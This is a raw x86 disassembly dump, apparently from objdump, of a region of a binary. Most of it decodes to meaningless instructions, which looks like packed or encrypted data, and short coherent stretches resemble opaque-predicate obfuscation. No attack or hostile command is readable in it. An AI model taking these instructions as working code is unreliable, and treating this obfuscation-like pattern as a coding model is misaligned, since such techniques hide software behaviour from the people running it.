  41d068:	loop   0x41d0a5
  41d06a:	sbb    eax,0x6180be8d
  41d06f:	push   esp
  41d070:	xchg   ecx,eax
  41d071:	or     eax,0x2aa0ca50
  41d076:	inc    ecx
  41d077:	aaa    
  41d078:	daa    
  41d079:	add    al,0x9f
  41d07b:	push   edi
  41d07c:	mov    ds:0x3ba2d6de,al
  41d081:	or     BYTE PTR [eax-0x52],dh
  41d084:	mov    bh,0x40
  41d086:	fcomp  DWORD PTR [edx-0x2166f6c8]
  41d08c:	xchg   DWORD PTR [ecx],esp
  41d08e:	dec    eax
  41d08f:	ss dec eax
  41d091:	add    BYTE PTR [edi-0x2585262a],ah
  41d097:	pop    ss
  41d098:	inc    esp
  41d099:	les    ebp,FWORD PTR [ebp+eax*4+0x6a]
  41d09d:	rcr    DWORD PTR [ebx],cl
  41d09f:	jge    0x41d111
  41d0a1:	jae    0x41d0aa
  41d0a3:	clc    
  41d0a4:	shl    BYTE PTR [ebp+0x6b],1
  41d0a7:	inc    edi
  41d0a8:	daa    
  41d0a9:	push   eax
  41d0aa:	mov    WORD PTR [edx-0x79],ds
  41d0ad:	push   ss
  41d0ae:	(bad)  
  41d0af:	imul   ebx,DWORD PTR [ecx+0x59],0xffffffad
  41d0b3:	mov    dh,BYTE PTR [ecx]
  41d0b5:	cmpxchg BYTE PTR [esp+ebp*2-0x9f10534],bh
  41d0bd:	xchg   esi,eax
  41d0be:	mov    ds,eax
  41d0c0:	lods   eax,DWORD PTR ds:[esi]
  41d0c1:	loop   0x41d10d
  41d0c3:	and    esp,DWORD PTR [edi]
  41d0c5:	ds jl  0x41d110
  41d0c8:	or     edi,esi
  41d0ca:	jg     0x41d0ff
  41d0cc:	mov    ecx,0x8ac12aa3
  41d0d1:	dec    esp
  41d0d2:	and    al,0x38
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0xf3bc6585
  41d15f:	mov    ebp,0x5d367edb
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1-0x2ea9e7e8],bh
  41d16c:	and    eax,0xf98d83f9
  41d171:	jp     0x41d1c1
  41d173:	xchg   DWORD PTR [edi+eax*1-0xd],edi
  41d177:	stc    
  41d178:	inc    edx
  41d179:	pop    ebx
  41d17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d17b:	aam    0xa2
  41d17d:	nop
  41d17e:	add    edi,DWORD PTR [ebp-0x6]
  41d181:	out    0x71,eax
  41d183:	call   0x291:0x79d92dba
  41d18a:	jle    0x41d15a
  41d18c:	scas   eax,DWORD PTR es:[edi]
  41d18d:	sti    
  41d18e:	sbb    edx,DWORD PTR [bp+si-0x27]
  41d192:	jno    0x41d13f
  41d194:	or     ecx,DWORD PTR [eax-0x2c]
  41d197:	rcl    BYTE PTR [ebp-0x129fbf35],0x1c
  41d19e:	aam    0xb6
  41d1a0:	push   es
  41d1a1:	in     al,0x84
  41d1a3:	xor    ebx,esp
  41d1a5:	popa   
  41d1a6:	mov    ch,0x3b
  41d1a8:	sbb    BYTE PTR [esi],al
  41d1aa:	push   edx
  41d1ab:	ja     0x41d159
  41d1ad:	xor    ch,dh
  41d1af:	cmc    
  41d1b0:	mov    eax,0x971bb137
  41d1b5:	and    ebp,eax
  41d1b7:	shl    ebx,0x88
  41d1ba:	mov    edx,0x44ae9a0c
  41d1bf:	test   DWORD PTR [eax],edi
  41d1c1:	dec    edi
  41d1c2:	nop
  41d1c3:	inc    esi
  41d1c4:	sub    ebx,eax
  41d1c6:	xchg   ch,al
  41d1c8:	leave  
  41d1c9:	lahf   
  41d1ca:	xor    ecx,DWORD PTR [ebp-0x25]
  41d1cd:	jge    0x41d232
  41d1cf:	add    bh,bl
  41d1d1:	mov    esp,DWORD PTR [edx]
  41d1d3:	(bad)  
  41d1d4:	adc    bl,bh
  41d1d6:	mov    ?,WORD PTR [ecx]
  41d1d8:	rcr    DWORD PTR [edx+0x60b664b],0x8a
  41d1df:	popa   
  41d1e0:	sbb    ebx,DWORD PTR [ebp+0x67a2b28a]
  41d1e6:	mov    esi,0x796eef36
  41d1eb:	outs   dx,DWORD PTR ds:[esi]
  41d1ec:	adc    eax,esi
  41d1ee:	xor    cl,BYTE PTR [esi]
  41d1f0:	loop   0x41d1af
  41d1f2:	shr    ecx,1
  41d1f4:	ror    DWORD PTR [ebx+0x43],cl
  41d1f7:	ror    BYTE PTR [ecx],0x12
  41d1fa:	ja     0x41d268
  41d1fc:	push   edx
  41d1fd:	mov    ebx,0x5d47e033
  41d202:	mov    dh,0x36
  41d204:	rcr    BYTE PTR [edx-0x1c],0x9d
  41d208:	sbb    ah,BYTE PTR [edi]
  41d20a:	mov    bh,0xcc
  41d20c:	mov    bh,ch
  41d20e:	and    bh,BYTE PTR [edi]
  41d210:	dec    ebp
  41d211:	lahf   
  41d212:	lock add dl,cl
  41d215:	and    al,0xde
  41d217:	push   cs
  41d218:	gs pop edi
  41d21a:	lods   eax,DWORD PTR ds:[esi]
  41d21b:	and    ah,al
  41d21d:	pop    ecx
  41d21e:	es jl  0x41d1e1
  41d221:	bound  edx,QWORD PTR [edx+0x62]
  41d224:	xchg   ebp,eax
  41d225:	(bad)  
  41d226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d227:	mov    ax,cs:0x25a3d198
  41d22e:	int    0xca
  41d230:	cli    
  41d231:	fidivr WORD PTR [eax+0x3]
  41d234:	push   ds
  41d235:	pop    edi
  41d236:	jbe    0x41d1e6
  41d238:	push   eax
  41d239:	push   ebx
  41d23a:	pop    edx
  41d23b:	pop    ebx
  41d23c:	test   eax,0xcf0ecb0d
  41d241:	add    edi,ecx
  41d243:	xchg   edx,eax
  41d244:	mov    ds:0xffdd717d,al
  41d249:	aad    0xea
  41d24b:	imul   edi,eax,0xd421efaf
  41d251:	out    0x28,eax
  41d253:	test   DWORD PTR [edx+0x69f2fcfd],eax
  41d259:	aad    0xd
  41d25b:	mov    bl,0xb7
  41d25d:	dec    ebp
  41d25e:	adc    al,0xd7
  41d260:	sbb    al,0xb2
  41d262:	adc    ebx,eax
  41d264:	xchg   edi,eax
  41d265:	jb     0x41d20b
  41d267:	xor    BYTE PTR [eax-0x6fdf563],0xe3
  41d26e:	mov    ebp,ss
  41d270:	pop    ebx
  41d271:	jae    0x41d245
  41d273:	shr    DWORD PTR ds:0xf90d54f5,cl
  41d279:	lock xlat BYTE PTR ds:[ebx]
  41d27b:	pop    es
  41d27c:	push   es
  41d27d:	add    ebp,DWORD PTR [esi]
  41d27f:	or     DWORD PTR [ebx-0x7a],0x5a0a9f01
  41d286:	inc    ebp
  41d287:	mov    ch,0xfe
  41d289:	mov    ds:0x65298867,eax
  41d28e:	push   ss
  41d28f:	jbe    0x41d2b3
  41d291:	mov    ?,WORD PTR [ebx+ebx*4-0x2c]
  41d295:	push   0x39b2b3e2
  41d29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d29b:	sbb    al,0xcc
  41d29d:	jnp    0x41d293
  41d29f:	and    edx,esi
  41d2a1:	sti    
  41d2a2:	mov    edx,0x633aa130
  41d2a7:	jmp    0xde97:0x94dd50a2
  41d2ae:	jbe    0x41d263
  41d2b0:	out    0xbf,al
  41d2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2b3:	out    dx,eax
  41d2b4:	push   ss
  41d2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2b6:	pop    ecx
  41d2b7:	mov    esi,esi
  41d2b9:	jb     0x41d242
  41d2bb:	cmp    eax,DWORD PTR [esi+0x76890682]
  41d2c1:	test   eax,0x78eda4
  41d2c6:	(bad)  
  41d2c7:	mov    esi,0xd31c751c
  41d2cc:	pop    DWORD PTR [ebp+0x8]
  41d2cf:	les    edx,FWORD PTR [edx+0x22c85595]
  41d2d5:	outs   dx,DWORD PTR ds:[esi]
  41d2d6:	icebp  
  41d2d7:	add    ebx,DWORD PTR [ecx-0x4]
  41d2da:	inc    ebx
  41d2db:	or     al,0x73
  41d2dd:	mov    cl,ah
  41d2df:	dec    ebp
  41d2e0:	stos   BYTE PTR es:[edi],al
  41d2e1:	int    0x58
  41d2e3:	adc    ecx,edx
  41d2e5:	mov    BYTE PTR [ebp+0x0],ah
  41d2e8:	sub    BYTE PTR [ebp+0x72],al
  41d2eb:	(bad)  
  41d2ec:	cli    
  41d2ed:	push   eax
  41d2ee:	mov    bh,0xfb
  41d2f0:	je     0x41d2d0
  41d2f2:	or     DWORD PTR [edi+eax*8-0x19],esp
  41d2f6:	add    al,0xb2
  41d2f8:	push   ss
  41d2f9:	xchg   ecx,eax
  41d2fa:	push   ebx
  41d2fb:	and    DWORD PTR [ebp+0x26],ebx
  41d2fe:	pop    eax
  41d2ff:	fstp   QWORD PTR [eax+0x15]
  41d302:	imul   esi,DWORD PTR [ebx+ebp*4],0x63
  41d306:	jne    0x41d28d
  41d308:	adc    DWORD PTR [ebx-0x2f],ebx
  41d30b:	sar    BYTE PTR [edx-0x6e24dd8],cl
  41d311:	cmc    
  41d312:	stos   DWORD PTR es:[edi],eax
  41d313:	bnd jns 0x41d31f
  41d316:	(bad)  
  41d317:	sub    esp,DWORD PTR [ebp+0x1c7e92b4]
  41d31d:	aas    
  41d31e:	aas    
  41d31f:	jb     0x41d38f
  41d321:	das    
  41d322:	mov    cl,0x66
  41d324:	addr16 hlt 
  41d326:	fisttp QWORD PTR [edx-0x56]
  41d329:	cdq    
  41d32a:	and    DWORD PTR [esi+edx*8-0x7f],esp
  41d32e:	stos   BYTE PTR es:[edi],al
  41d32f:	shl    DWORD PTR [esi-0x29d33307],cl
  41d335:	pop    ebp
  41d336:	mov    WORD PTR [edi-0x68],fs
  41d339:	jno    0x41d380
  41d33b:	xchg   edx,eax
  41d33c:	fsub   QWORD PTR [ecx]
  41d33e:	out    0x9a,al
  41d340:	xlat   BYTE PTR ds:[ebx]
  41d341:	(bad)  
  41d342:	push   edx
  41d343:	add    edi,esp
  41d345:	sbb    BYTE PTR es:[ebx-0x409b9bc9],ch
  41d34c:	sar    DWORD PTR [edi],cl
  41d34e:	adc    al,0xf1
  41d350:	or     ebp,DWORD PTR [eax+0x5dbd4c32]
  41d356:	imul   ecx,DWORD PTR [esi+0x3e],0xffffffd6
  41d35a:	mov    ?,WORD PTR [ebx+0x49fb4363]
  41d360:	xor    BYTE PTR ds:0xcafd3d0f,0x8b
  41d367:	push   ss
  41d368:	sub    DWORD PTR [ecx+0x595d21ca],0xffffff84
  41d36f:	mul    DWORD PTR [edx+edi*8+0x58]
  41d373:	div    BYTE PTR [esi-0x6c92f3ef]
  41d379:	or     al,0x92
  41d37b:	imul   edx,DWORD PTR [ebx+0x2f],0xfffffff9
  41d37f:	inc    ebx
  41d380:	xchg   edx,eax
  41d381:	cmp    BYTE PTR [ebp-0x2889e004],al
  41d387:	push   esi
  41d388:	int3   
  41d389:	pushf  
  41d38a:	pusha  
  41d38b:	cli    
  41d38c:	or     dl,0x91
  41d38f:	jle    0x41d34f
  41d391:	or     ebp,esp
  41d393:	xor    esi,edx
  41d395:	cmp    ecx,DWORD PTR [edi+0x31578338]
  41d39b:	or     ebx,DWORD PTR [ebx+0x51008a3d]
  41d3a1:	sub    DWORD PTR ds:0x2d010f50,0xffffffe9
  41d3a8:	push   edi
  41d3a9:	push   esp
  41d3aa:	inc    ebp
  41d3ab:	cs jne 0x41d41d
  41d3ae:	xchg   ebp,eax
  41d3af:	xchg   ecx,eax
  41d3b0:	cs jo  0x41d336
  41d3b3:	sbb    DWORD PTR [ebx+edx*4-0x6e25b307],0x8fe6a9ed
  41d3be:	aaa    
  41d3bf:	inc    eax
  41d3c0:	ret    0xa07e
  41d3c3:	cwde   
  41d3c4:	add    BYTE PTR [edx-0xd578cf0],0xb7
  41d3cb:	clc    
  41d3cc:	push   ds
  41d3cd:	into   
  41d3ce:	dec    edx
  41d3cf:	add    DWORD PTR [edx+0x42321a16],eax
  41d3d5:	ror    BYTE PTR ds:0x8efd98f,0xed
  41d3dc:	cmp    al,0x89
  41d3de:	out    dx,al
  41d3df:	aam    0x14
  41d3e1:	inc    ebx
  41d3e2:	pop    esp
  41d3e3:	inc    edi
  41d3e4:	mov    ah,0x59
  41d3e6:	adc    esp,DWORD PTR [edi+ebp*2+0xc]
  41d3ea:	cmp    bh,BYTE PTR [edi]
  41d3ec:	add    eax,0xb68642da
  41d3f1:	adc    BYTE PTR [esp+ebp*8+0x6d2a5882],cl
  41d3f8:	sbb    ch,ch
  41d3fa:	test   al,0xc
  41d3fc:	ror    DWORD PTR [ebx+0x60],0xdc
  41d400:	loopne 0x41d3ea
  41d402:	mov    esp,0x6f583a45
  41d407:	lock sahf 
  41d409:	and    DWORD PTR [eax+0x69],edx
  41d40c:	jle    0x41d41a
  41d40e:	jecxz  0x41d462
  41d410:	clc    
  41d411:	pushf  
  41d412:	outs   dx,BYTE PTR ds:[esi]
  41d413:	dec    esi
  41d414:	loopne 0x41d39c
  41d416:	cwde   
  41d417:	lock cmc 
  41d419:	xchg   edi,eax
  41d41a:	pusha  
  41d41b:	pop    edi
  41d41c:	cmp    DWORD PTR [edx],eax
  41d41e:	nop
  41d41f:	mov    al,0x2c
  41d421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d422:	and    ebx,DWORD PTR [ebx+edi*1+0x1145a20a]
  41d429:	sub    edx,edx
  41d42b:	inc    ebx
  41d42c:	xchg   edi,eax
  41d42d:	jecxz  0x41d484
  41d42f:	popf   
  41d430:	cld    
  41d431:	cmp    eax,0x1b1db0ec
  41d436:	pop    ecx
  41d437:	mov    ah,0x30
  41d439:	test   eax,0xca47e0c0
  41d43e:	jns    0x41d4a7
  41d440:	out    0xda,al
  41d442:	push   ds
  41d443:	into   
  41d444:	repz sbb eax,0x9256adfc
  41d44a:	mov    esi,0xe144ac7a
  41d44f:	jns    0x41d474
  41d451:	cmp    edi,ebx
  41d453:	outs   dx,DWORD PTR ds:[esi]
  41d454:	cmp    ah,BYTE PTR [ecx]
  41d456:	or     bl,BYTE PTR [ebp-0x325fe33]
  41d45c:	add    eax,0xe010fd57
  41d461:	adc    esi,ebx
  41d463:	push   0x53
  41d465:	shl    al,1
  41d467:	outs   dx,BYTE PTR ds:[esi]
  41d468:	int3   
  41d469:	das    
  41d46a:	cs int 0xc2
  41d46d:	jl     0x41d4bf
  41d46f:	iret   
  41d470:	(bad)  
  41d471:	sahf   
  41d472:	and    eax,0x629346fc
  41d477:	test   DWORD PTR [edx-0xe],0xef27586e
  41d47e:	int    0x87
  41d480:	inc    edx
  41d481:	push   0xffffffa5
  41d483:	jge    0x41d44b
  41d485:	rcr    DWORD PTR [edx+edx*8-0x54],1
  41d489:	dec    eax
  41d48a:	(bad)  
  41d48b:	outs   dx,BYTE PTR ds:[esi]
  41d48c:	mov    esp,0x9c300e7c
  41d491:	stos   BYTE PTR es:[edi],al
  41d492:	and    cl,BYTE PTR [ebp-0x25b4c5c6]
  41d498:	and    DWORD PTR [esi-0x38ea8cb],esi
  41d49e:	cmp    eax,0x88624aa8
  41d4a3:	rol    BYTE PTR fs:[edi],0xc8
  41d4a7:	pop    esp
  41d4a8:	pop    ebx
  41d4a9:	xchg   ecx,eax
  41d4aa:	and    ch,BYTE PTR [edx]
  41d4ac:	mov    eax,0xa430e838
  41d4b1:	arpl   WORD PTR [esi],sp
  41d4b3:	push   bx
  41d4b5:	(bad)  
  41d4b7:	jge    0x41d43c
  41d4b9:	cmp    esp,DWORD PTR [edi]
  41d4bb:	inc    edi
  41d4bc:	setb   BYTE PTR [esi+0x6f91d9f6]
  41d4c3:	lds    ebx,FWORD PTR [edx+0x63]
  41d4c6:	lds    esi,FWORD PTR [edi+0x4c202166]
  41d4cc:	call   0x71232835
  41d4d1:	into   
  41d4d2:	jne    0x41d4d0
  41d4d4:	rcl    BYTE PTR ds:[esi+edi*8],0x68
  41d4d9:	ret    
  41d4da:	dec    edi
  41d4db:	fsub   DWORD PTR [ebx-0x59]
  41d4de:	inc    ebx
  41d4df:	push   ss
  41d4e0:	adc    bl,BYTE PTR [ebp+edi*8-0x36f70a9d]
  41d4e7:	cmp    BYTE PTR [esi+ebx*1+0x42fe3452],0xa3
  41d4ef:	mov    esi,0x4eadb19a
  41d4f4:	mov    edi,ebp
  41d4f6:	mov    ebx,0x48ad61ba
  41d4fb:	xchg   edx,eax
  41d4fc:	sar    DWORD PTR [esi-0x46c4d994],cl
  41d502:	data16 repnz shl BYTE PTR [ecx+0x2a77092c],0xd3
  41d50b:	dec    esp
  41d50c:	and    DWORD PTR [edx],esp
  41d50e:	add    eax,0xe028515a
  41d513:	push   esp
  41d514:	call   0xb03a68df
  41d519:	clc    
  41d51a:	xor    DWORD PTR [edx+0x404850f],ebp
  41d520:	add    BYTE PTR [eax],al
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d56f
  41d54b:	jmp    0x41d580
  41d54d:	push   0xffffffda
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1-0x6970e7e8],bh
  41d558:	test   BYTE PTR [esi],ah
  41d55a:	ins    BYTE PTR es:[edi],dx
  41d55b:	ins    DWORD PTR es:[edi],dx
  41d55c:	dec    sp
  41d55e:	lods   al,BYTE PTR ds:[esi]
  41d55f:	sub    al,0xc
  41d561:	cmp    DWORD PTR [ebp+eiz*4-0x43083fb0],edx
  41d568:	jle    0x41d565
  41d56a:	and    eax,0xbfcba701
  41d56f:	fisttp QWORD PTR [edi+0x791b05a0]
  41d575:	dec    edi
  41d576:	leave  
  41d577:	xchg   edx,eax
  41d578:	dec    ebp
  41d579:	(bad)  
  41d57a:	jns    0x41d562
  41d57c:	sbb    al,0xe4
  41d57e:	jne    0x41d515
  41d580:	jnp    0x41d5fc
  41d582:	out    dx,al
  41d583:	arpl   cx,bx
  41d585:	fist   DWORD PTR [esi]
  41d587:	ret    
  41d588:	pusha  
  41d589:	inc    edi
  41d58a:	mov    bh,0x60
  41d58c:	mov    DWORD PTR [edx-0x68eff1b7],eax
  41d592:	adc    al,0xaa
  41d594:	pop    edx
  41d595:	xor    esp,DWORD PTR [edi]
  41d597:	adc    BYTE PTR [esi],cl
  41d599:	or     eax,0x8b3d112a
  41d59e:	inc    ebx
  41d59f:	pop    ss
  41d5a0:	mov    ds:0x858b3b23,al
  41d5a5:	inc    esi
  41d5a6:	and    BYTE PTR [edi-0x77],ah
  41d5a9:	sub    dh,bl
  41d5ab:	lea    ebp,[edi+edx*8+0x45]
  41d5af:	out    dx,eax
  41d5b0:	leave  
  41d5b1:	mov    bl,0xed
  41d5b3:	daa    
  41d5b4:	clc    
  41d5b5:	shl    DWORD PTR [ebx-0x26],cl
  41d5b8:	shl    BYTE PTR [eax+0x3f],1
  41d5bb:	jb     0x41d57c
  41d5bd:	inc    ecx
  41d5be:	mov    DWORD PTR [ebx+ebp*2-0x80],esp
  41d5c2:	into   
  41d5c3:	iret   
  41d5c4:	adc    BYTE PTR [esi-0x73164e3a],dh
  41d5ca:	jecxz  0x41d5d9
  41d5cc:	add    al,0x93
  41d5ce:	pop    ds
  41d5cf:	cmc    
  41d5d0:	adc    DWORD PTR [esi],edi
  41d5d2:	cmp    DWORD PTR [esi],ebp
  41d5d4:	aad    0xd3
  41d5d6:	pop    ecx
  41d5d7:	mov    BYTE PTR [eax-0x5c],dh
  41d5da:	sbb    DWORD PTR [ecx+eiz*4-0x765c1459],esp
  41d5e1:	retf   0x60c
  41d5e4:	iret   
  41d5e5:	jmp    0xe290b270
  41d5ea:	sbb    edi,eax
  41d5ec:	cwde   
  41d5ed:	cdq    
  41d5ee:	inc    ecx
  41d5ef:	jmp    0x41d577
  41d5f1:	pop    ebx
  41d5f2:	repz push bx
  41d5f5:	data16 or bl,bl
  41d5f8:	repz mov WORD PTR [ecx],ds
  41d5fb:	and    DWORD PTR [ebp+0x7ca13880],eax
  41d601:	mov    cl,0xbf
  41d603:	int    0x7b
  41d605:	pop    es
  41d606:	jo     0x41d5a6
  41d608:	cmovle edx,DWORD PTR [edx-0x71]
  41d60c:	shr    BYTE PTR [edx+0x74],1
  41d60f:	pop    esi
  41d610:	into   
  41d611:	cmc    
  41d612:	xchg   esp,eax
  41d613:	mov    ebp,DWORD PTR [esi-0x48d85747]
  41d619:	add    eax,0xf26dd9b6
  41d61e:	dec    esi
  41d61f:	loopne 0x41d689
  41d621:	or     dh,BYTE PTR [edx+0x7e]
  41d624:	fisttp WORD PTR [ebp-0x11a060fc]
  41d62a:	inc    ecx
  41d62b:	mov    ch,BYTE PTR [esi-0x715e9a8c]
  41d631:	add    eax,0x7996a21a
  41d636:	xchg   ebx,eax
  41d637:	jo     0x41d6a9
  41d639:	or     bh,dl
  41d63b:	test   al,0xf0
  41d63d:	call   0x24b93617
  41d642:	sahf   
  41d643:	xor    dl,BYTE PTR [ecx]
  41d645:	or     DWORD PTR [edi+0x1742e74d],edx
  41d64b:	or     eax,0x4fe3e1a5
  41d650:	inc    ebp
  41d651:	neg    DWORD PTR [eax+edi*2+0x723ef288]
  41d658:	aad    0xa6
  41d65a:	mul    DWORD PTR [esi+0x3a]
  41d65d:	jge    0x41d665
  41d65f:	adc    DWORD PTR fs:[edi],0x1
  41d663:	jle    0x41d5f8
  41d665:	mov    bl,0x57
  41d667:	clc    
  41d668:	loopne 0x41d677
  41d66a:	or     cl,BYTE PTR [edx]
  41d66c:	arpl   bx,cx
  41d66e:	dec    edi
  41d66f:	jnp    0x41d6cc
  41d671:	retf   
  41d672:	pop    ecx
  41d673:	loope  0x41d6d7
  41d675:	mov    edx,0x6dff815c
  41d67a:	rcr    DWORD PTR [edi],0x37
  41d67d:	loop   0x41d6b1
  41d67f:	xor    eax,0x8fd3343a
  41d684:	mov    edx,0xd7d995c8
  41d689:	icebp  
  41d68a:	sbb    eax,0x67e90122
  41d68f:	push   ss
  41d690:	out    0xdf,eax
  41d692:	jmp    0x51f1:0xc9cb5d63
  41d699:	sti    
  41d69a:	ins    BYTE PTR es:[edi],dx
  41d69b:	add    dh,BYTE PTR [ecx-0x574c9b42]
  41d6a1:	xchg   esp,eax
  41d6a2:	mov    dh,0x22
  41d6a4:	mov    ebx,0x87598620
  41d6a9:	pop    ebx
  41d6aa:	xchg   esi,eax
  41d6ab:	int3   
  41d6ac:	push   edi
  41d6ad:	repz mov ds:0x7cacca81,al
  41d6b3:	or     al,dh
  41d6b5:	loopne 0x41d6e8
  41d6b7:	push   ss
  41d6b8:	pop    ds
  41d6b9:	pop    ds
  41d6ba:	jmp    0x41d694
  41d6bc:	or     dl,dl
  41d6be:	pop    ebx
  41d6bf:	cmp    DWORD PTR [eax],0x6a62e430
  41d6c5:	(bad)  
  41d6c6:	in     eax,dx
  41d6c7:	mov    cl,0x8b
  41d6c9:	(bad)  
  41d6cb:	dec    esi
  41d6cc:	ret    
  41d6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ce:	inc    ebp
  41d6cf:	mov    bl,0xdd
  41d6d1:	fs push ss
  41d6d3:	test   edx,ecx
  41d6d5:	loopne 0x41d6a5
  41d6d7:	or     dh,ah
  41d6d9:	adc    ebx,DWORD PTR [esp+esi*8-0x3857ebb1]
  41d6e0:	push   eax
  41d6e1:	adc    bl,BYTE PTR [esi]
  41d6e3:	adc    ah,ah
  41d6e5:	xchg   ebx,eax
  41d6e6:	push   ds
  41d6e7:	ret    0x62e8
  41d6ea:	pop    edx
  41d6eb:	or     BYTE PTR ds:0xca997af6,0xdb
  41d6f2:	mov    ebx,0x4f1cbd33
  41d6f7:	cdq    
  41d6f8:	or     ch,al
  41d6fa:	fcmovb st,st(7)
  41d6fc:	xchg   DWORD PTR [eax],eax
  41d6fe:	sbb    al,0x48
  41d700:	lds    edi,FWORD PTR [ebx-0x65]
  41d703:	mov    edx,0x68fae96
  41d708:	inc    ecx
  41d709:	addr16 xchg edx,eax
  41d70b:	and    esp,DWORD PTR ds:0x7d0a3e5b
  41d711:	cwde   
  41d712:	addr16 mov al,0xbc
  41d715:	push   edx
  41d716:	leave  
  41d717:	sahf   
  41d718:	pop    edx
  41d719:	or     al,BYTE PTR [eax-0x170aedbc]
  41d71f:	or     eax,0xbe27bc04
  41d724:	jo     0x41d6af
  41d726:	ds clc 
  41d728:	rcr    bl,1
  41d72a:	repnz fst QWORD PTR [ebx+0x3b]
  41d72e:	frstor [ebx]
  41d730:	xchg   esi,eax
  41d731:	int    0x21
  41d733:	lahf   
  41d734:	fs cmp DWORD PTR cs:[ebp-0x48],edi
  41d739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d73a:	jne    0x41d726
  41d73c:	aam    0xa6
  41d73e:	xchg   DWORD PTR [ecx],esp
  41d740:	push   esi
  41d741:	cmp    DWORD PTR [ebx+0x49],esp
  41d744:	stc    
  41d745:	(bad)  
  41d746:	lock loop 0x41d707
  41d749:	retf   0xaab8
  41d74c:	cld    
  41d74d:	cmp    ebx,DWORD PTR [ebp-0x7f]
  41d750:	jns    0x41d7b7
  41d752:	sti    
  41d753:	inc    eax
  41d754:	sbb    DWORD PTR [ebx],eax
  41d756:	(bad)  
  41d757:	push   cs
  41d758:	inc    eax
  41d759:	mov    ebp,0xa8d1eb18
  41d75e:	push   ebx
  41d75f:	mov    ds:0xa6a2286,al
  41d764:	out    0x43,eax
  41d766:	ret    
  41d767:	es loopne 0x41d71f
  41d76a:	jae    0x41d756
  41d76c:	lods   al,BYTE PTR ds:[esi]
  41d76d:	xchg   esp,eax
  41d76e:	adc    dl,BYTE PTR [ecx+0x741a8cce]
  41d774:	in     al,0x94
  41d776:	sbb    DWORD PTR [eax],ebx
  41d778:	jge    0x41d7db
  41d77a:	jge    0x41d769
  41d77c:	sub    al,0xdc
  41d77e:	in     eax,dx
  41d77f:	out    dx,al
  41d780:	xor    ebp,esp
  41d782:	sub    DWORD PTR [ebx-0x72],ecx
  41d785:	dec    edx
  41d786:	or     ah,BYTE PTR [esi+0x5d]
  41d789:	push   ebx
  41d78a:	adc    al,0x8
  41d78c:	retf   0xa0b8
  41d78f:	sub    dh,BYTE PTR [esi-0xd]
  41d792:	cmp    ebx,esp
  41d794:	in     al,0x54
  41d796:	lahf   
  41d797:	arpl   WORD PTR [ecx+0x4a94f9e1],si
  41d79d:	push   ebp
  41d79e:	das    
  41d79f:	popa   
  41d7a0:	lods   al,BYTE PTR ds:[esi]
  41d7a1:	or     dl,al
  41d7a3:	pushf  
  41d7a4:	or     eax,esp
  41d7a6:	pop    ss
  41d7a7:	dec    esp
  41d7a8:	pop    ebp
  41d7a9:	pop    eax
  41d7aa:	ret    0x620c
  41d7ad:	cmp    al,0xaa
  41d7af:	cmp    DWORD PTR [eax-0x1bbb72b2],0x17
  41d7b6:	mov    ebx,?
  41d7b8:	cmp    BYTE PTR [edi-0x39],al
  41d7bb:	loop   0x41d78f
  41d7bd:	inc    eax
  41d7be:	nop
  41d7bf:	add    eax,0x4a
  41d7c2:	loope  0x41d7de
  41d7c4:	mov    eax,0x95d633c
  41d7c9:	aas    
  41d7ca:	neg    BYTE PTR [edi-0xf]
  41d7cd:	push   cs
  41d7ce:	jp     0x41d7ff
  41d7d0:	loopne 0x41d771
  41d7d2:	adc    DWORD PTR [ebx],esi
  41d7d4:	mov    edi,0x15872e2f
  41d7d9:	(bad)  
  41d7da:	rol    BYTE PTR [edi-0x6741d9d7],1
  41d7e0:	rol    DWORD PTR [ebx+0x62],1
  41d7e3:	sub    al,0x8e
  41d7e5:	pop    ss
  41d7e6:	push   ds
  41d7e7:	ss out 0xf5,eax
